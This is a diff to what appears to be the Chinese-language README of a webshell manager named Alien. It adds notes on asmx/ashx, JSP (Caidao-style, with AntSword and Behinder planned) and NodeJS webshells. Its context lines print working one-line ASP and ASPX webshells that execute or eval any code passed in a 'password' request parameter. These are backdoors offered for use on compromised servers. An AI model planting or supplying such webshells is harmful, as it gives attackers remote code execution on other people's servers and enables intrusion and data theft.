@@ -26,8 +26,15 @@ C# .NET Framework V4.8
 ```<%execute(request("password"))%>```
 - ASPX
 ```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
+當然, Alien還可以使用asmx, ashx等等的Webshell。
 
-當然, Alien還可以使用asmx, ashx的Webshell。
+## 關於JSP webshell
+目前只有比較原始的菜刀版本, 之後可能會加上蟻劍和冰蝎\
+shell有進行更改, 新增了可以顯示圖片的功能
+
+## 關於NodeJS webshell
+基於NodeJS特性, 原理跟一般php asp aspx等動態語言的shell不同, \
+NodeJS目的重在管理而非滲透
 
 ## 伺服器
 Windows Linux Unix MacOS
